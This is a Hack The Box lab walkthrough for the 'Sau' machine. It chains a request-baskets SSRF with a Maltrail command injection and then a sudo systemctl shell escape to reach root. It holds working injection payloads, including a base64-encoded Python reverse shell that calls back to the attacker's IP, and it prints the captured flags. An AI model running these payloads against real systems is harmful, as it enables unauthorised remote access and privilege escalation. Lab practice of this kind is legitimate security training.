HacktheBox Machine
## Enumeration(Recon)
**Nmap**
```terminal
└─# nmap 10.10.11.224
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown
```
**Second scan**
```terminal
└─# nmap -sV -sC -p22,80,55555 10.10.11.224
Host is up (0.36s latency).

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 18 Oct 2023 18:18:16 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 18 Oct 2023 18:17:40 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 18 Oct 2023 18:17:41 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```
As we can see the port 80 is filtered, i visited the port 55555 and found : http://sau.htb:55555/web
in that website i also found : `Powered by request-baskets | Version: 1.2.1`.
I googled that and found a cve. CVE-2023-27163 and : https://github.com/entr0pie/CVE-2023-27163
Easy to run
```terminal
└─# ./CVE-2023-27163.sh http://sau.htb:55555/ http://127.0.0.1:80
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "ozlhzi" proxy basket...
> Basket created!
> Accessing http://sau.htb:55555/ozlhzi now makes the server request to http://127.0.0.1:80.
> Authorization: A4QIc8chm_b3mKbSpry_RhaaJE54RnI6ivRfICOfQHZu
```
When i visited the created basket url. i got other web apps with this : Powered by Maltrail (v0.53) and i searched it on Google.
found : https://www.exploit-db.com/exploits/51676 , https://github.com/spookier/Maltrail-v0.53-Exploit Unauthenticated RCE.
The vulnerability is in the login page(username).
 If we try to run this attack directly on the basket that we created for http://127.0.0.1:80 then it won't work because the attack targets the username parameter of the login page (mentioned in the README). So, we need to first find the login page and then create a basket with the previous CVE that redirects to the Maltrail's login page. Again with some googling, we can find that the login page is simply called login.
 I will use this in burpsuite: 
 Intercept when i create a basket: `POST /api/baskets/dpiv9e4 `
 Now i add
 ```terminal

{"forward_url": "http://127.0.0.1:80/login","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}

 ```
 By exploiting the SSRF vulnerability and sending the required parameters in a POST request to the login route, we will be able to execute commands on the system and eventually escalate privileges.
Then i changed the requested method to GET
```
GET /blomannn?username=%3b`ping+-c+5+10.10.16.41` 
```
and `sudo tcpdump -i tun0` and i got ping response:

## Reverse shell
In burp i changed it, i got shell and encode it in base64
```terminal
GET /blomannn?username=%3b`echo+ZXhwb3J0IFJIT1NUPSIxMC4xMC4xNC4xNjgiO2V4cG9ydCBSUE9SVD0xMzM3O3B5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oInNoIikn+|base64+-d+|+sh`
```

```terminal
└─# nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.168] from (UNKNOWN) [10.10.11.224] 54236
$ id
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
$ 
```
```terminal
puma@sau:~$ cat user.txt
cat user.txt
7ab8c93f5f609b67bf480bb944256eae
puma@sau:~$ 
```
### Escalation
```terminal
puma@sau:~$ sudo -l -l
sudo -l -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:

Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Options: !authenticate
    Commands:
	/usr/bin/systemctl status trail.service
puma@sau:~$ 
```
first i was looking for sudo privilege escalation and i see this, Now i will search in gtfobins
```terminal
sudo  /usr/bin/systemctl status trail.service
!sh
# id;hostnamectl
id;hostnamectl
uid=0(root) gid=0(root) groups=0(root)
   Static hostname: sau
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 639e21ff5f8845cfa768d4c6f1ed568f
           Boot ID: e9ddadc0bcf2420a8f1128142b598c7f
    Virtualization: vmware
  Operating System: Ubuntu 20.04.6 LTS
            Kernel: Linux 5.4.0-153-generic
      Architecture: x86-64
root :fcfb5f4635f0f18579adcba47f0b6496

```